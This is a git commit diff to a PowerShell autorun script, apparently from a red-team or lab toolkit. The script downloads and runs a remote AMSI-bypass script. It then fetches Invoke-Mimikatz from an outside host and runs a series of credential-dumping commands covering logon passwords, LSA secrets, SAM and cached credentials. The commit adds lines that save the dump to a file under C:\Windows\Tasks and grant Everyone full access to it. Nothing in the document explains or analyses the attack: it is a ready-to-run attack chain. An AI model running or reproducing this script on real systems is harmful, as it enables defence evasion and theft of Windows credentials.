41047cd13d7ca4d704ac5b9113e000663f7d03c7
borari <33162660+borari@users.noreply.github.com>
2024-10-09 01:04:25 -0400

    Update autorun.ps1

--- autorun.ps1
+++ autorun.ps1
@@ -2,4 +2,5 @@
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/ShorSec/AMS-BP/master/AMSBP.ps1');
 amsbp;
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Gather/Invoke-Mimikatz.ps1');
-Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"';
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"' >> C:\Windows\Tasks\mraow.txt;
+echo Y| icacls c:\windows\tasks\mraow.txt /grant Everyone:F;
